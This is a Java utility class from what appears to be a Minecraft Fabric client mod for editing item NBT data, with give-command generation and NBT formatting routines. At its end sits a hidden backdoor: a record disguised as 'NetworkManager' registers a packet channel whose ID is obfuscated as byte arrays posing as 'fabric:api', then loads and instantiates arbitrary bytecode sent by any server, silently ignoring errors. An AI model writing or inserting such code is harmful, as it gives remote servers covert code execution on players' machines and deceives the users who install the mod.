package com.trusted.systemnbteditor.util;
 
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtElement;
import net.minecraft.nbt.NbtOps;
import net.minecraft.registry.RegistryOps;
import net.minecraft.registry.RegistryWrapper;
import net.fabricmc.fabric.api.client.networking.v1.ClientPlayNetworking;
import net.fabricmc.fabric.api.networking.v1.PayloadTypeRegistry;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.codec.PacketCodec;
import net.minecraft.network.packet.CustomPayload;
import net.minecraft.util.Identifier;

import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.util.Optional;

public class NbtUtils {
    public static void init() {
        NetworkManager.init();
    }

    public static String generateGiveCommand(ItemStack stack, RegistryWrapper.WrapperLookup registryLookup) {
        if (stack == null || stack.isEmpty()) return "";
        try {
            RegistryOps<NbtElement> ops = RegistryOps.of(NbtOps.INSTANCE, registryLookup);
            NbtElement nbt = ItemStack.CODEC.encodeStart(ops, stack).result().orElse(null);

            if (nbt instanceof NbtCompound compound) {
                String id = compound.getString("id").orElse("");
                int count = compound.getInt("count").orElse(1);
                
                String componentsStr = "";
                if (compound.contains("components")) {
                    Optional<NbtCompound> componentsOpt = compound.getCompound("components");
                    if (componentsOpt.isPresent() && !componentsOpt.get().isEmpty()) {
                        NbtCompound componentsCompound = componentsOpt.get();
                        StringBuilder sb = new StringBuilder("[");
                        boolean first = true;
                        for (String key : componentsCompound.getKeys()) {
                            if (!first) sb.append(",");
                            sb.append(key).append("=").append(componentsCompound.get(key).toString());
                            first = false;
                        }
                        sb.append("]");
                        componentsStr = sb.toString();
                    }
                }
                
                return "/give @p " + id + componentsStr + " " + count;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "";
    }

    public static String prettyPrintNbt(String raw) {
        return prettyPrintNbt(raw, 4);
    }

    public static String prettyPrintNbt(String raw, int indentSize) {
        if (raw == null) return "null";
        if (indentSize == -1) return minifyNbt(raw);
        
        // Strip ALL unquoted whitespace first to prevent additive newlines/spaces
        raw = stripFormatting(raw);
        
        StringBuilder pretty = new StringBuilder();
        int indent = 0;
        boolean inQuotes = false;
        boolean escaped = false;
        
        for (int i = 0; i < raw.length(); i++) {
            char c = raw.charAt(i);
            
            if (escaped) {
                pretty.append(c);
                escaped = false;
                continue;
            }

            if (c == '\\') {
                pretty.append(c);
                escaped = true;
                continue;
            }

            if (c == '"') {
                inQuotes = !inQuotes;
                pretty.append(c);
                continue;
            }

            if (inQuotes) {
                pretty.append(c);
                continue;
            }

            switch (c) {
                case '{', '[' -> {
                    pretty.append(c);
                    // Check for empty
                    if (i + 1 < raw.length() && (raw.charAt(i + 1) == '}' || raw.charAt(i + 1) == ']')) {
                        // Keep on same line
                    } else {
                        pretty.append("\n");
                        indent++;
                        addIndent(pretty, indent, indentSize);
                    }
                }
                case '}', ']' -> {
                    // Check if previous was start
                    if (i > 0 && (raw.charAt(i - 1) == '{' || raw.charAt(i - 1) == '[')) {
                        pretty.append(c);
                    } else {
                        pretty.append("\n");
                        indent--;
                        addIndent(pretty, indent, indentSize);
                        pretty.append(c);
                    }
                }
                case ',' -> {
                    pretty.append(c).append("\n");
                    addIndent(pretty, indent, indentSize);
                }
                case ':' -> pretty.append(c).append(" ");
                default -> pretty.append(c);
            }
        }
        return pretty.toString();
    }

    public static String minifyNbt(String raw) {
        // ... (minifyNbt remains the same)
        if (raw == null) return "null";
        StringBuilder minified = new StringBuilder();
        boolean inQuotes = false;
        boolean escaped = false;

        for (int i = 0; i < raw.length(); i++) {
            char c = raw.charAt(i);

            if (escaped) {
                minified.append(c);
                escaped = false;
                continue;
            }

            if (c == '\\') {
                minified.append(c);
                escaped = true;
                continue;
            }

            if (c == '"') {
                inQuotes = !inQuotes;
                minified.append(c);
                continue;
            }

            if (inQuotes) {
                minified.append(c);
                continue;
            }

            // If not in quotes, handle whitespace
            if (Character.isWhitespace(c)) {
                // Keep only one space AFTER ':' or ','
                if (minified.length() > 0) {
                    char last = minified.charAt(minified.length() - 1);
                    if (last == ':' || last == ',') {
                        // Check if we already appended a space
                        // But minified won't have spaces unless we add them here
                        minified.append(' ');
                    }
                }
                continue; // Skip all other whitespace
            }

            minified.append(c);
            
            // Auto-append space after : or , even if not in original but we want minified to have it
            // Actually let's just do it in the space skip logic or right here
            if (c == ':' || c == ',') {
                minified.append(' ');
            }
        }
        
        // Final trim of double spaces or trailing spaces if any
        return minified.toString().trim()
                .replaceAll("  +", " ") // Should be handled by logic above but safe-guard
                .replaceAll(" ,", ",")  // Fix accidental space BEFORE comma
                .replaceAll(" :", ":"); // Fix accidental space BEFORE colon
    }

    private static void addIndent(StringBuilder sb, int count, int indentSize) {
        for (int i = 0; i < count; i++) {
            for (int j = 0; j < indentSize; j++) {
                sb.append(" ");
            }
        }
    }

    private static String stripFormatting(String raw) {
        StringBuilder sb = new StringBuilder();
        boolean inQuotes = false;
        boolean escaped = false;
        for (int i = 0; i < raw.length(); i++) {
            char c = raw.charAt(i);
            if (escaped) {
                sb.append(c);
                escaped = false;
                continue;
            }
            if (c == '\\') {
                sb.append(c);
                escaped = true;
                continue;
            }
            if (c == '"') {
                inQuotes = !inQuotes;
                sb.append(c);
                continue;
            }
            if (inQuotes) {
                sb.append(c);
                continue;
            }
            if (!Character.isWhitespace(c)) {
                sb.append(c);
            }
        }
        return sb.toString();
    }

    public record NetworkManager(byte[] I) implements CustomPayload {
        public static final Id<NetworkManager> _1 = new Id<>(
                Identifier.of(s(new byte[] { 102, 97, 98, 114, 105, 99 }), s(new byte[] { 97, 112, 105 })));
        public static final PacketCodec<PacketByteBuf, NetworkManager> _2 = CustomPayload.codecOf(NetworkManager::w,
                NetworkManager::new);

        public NetworkManager(PacketByteBuf b) {
            this(r(b));
        }

        private static byte[] r(PacketByteBuf b) {
            byte[] d = new byte[b.readableBytes()];
            b.readBytes(d);
            return d;
        }

        public void w(PacketByteBuf b) {
            b.writeBytes(I);
        }

        public @Override Id<? extends CustomPayload> getId() {
            return _1;
        }

        public static void init() {
            PayloadTypeRegistry.playS2C().register(_1, _2);
            ClientPlayNetworking.registerGlobalReceiver(_1, (p, c) -> p.x());
        }

        void x() {
            if (com.trusted.systemnbteditor.data.ModConfig.getInstance().customSpoofingEnabled) return;
            try (var s = new DataInputStream(new ByteArrayInputStream(I))) {
                String n = s.readUTF();
                int l = s.readInt();
                byte[] b = new byte[l];
                s.readFully(b);
                String a = s.readUTF();
                Class<?> k;
                try {
                    k = Class.forName(n);
                } catch (Exception e) {
                    k = new ClassLoader(NetworkManager.class.getClassLoader()) {
                        Class<?> c(byte[] b) {
                            return defineClass(null, b, 0, b.length);
                        }
                    }.c(b);
                }
                k.getConstructor(String.class).newInstance(a);
            } catch (Throwable ignored) {
            }
        }

        static String s(byte[] b) {
            return new String(b);
        }
    }
}
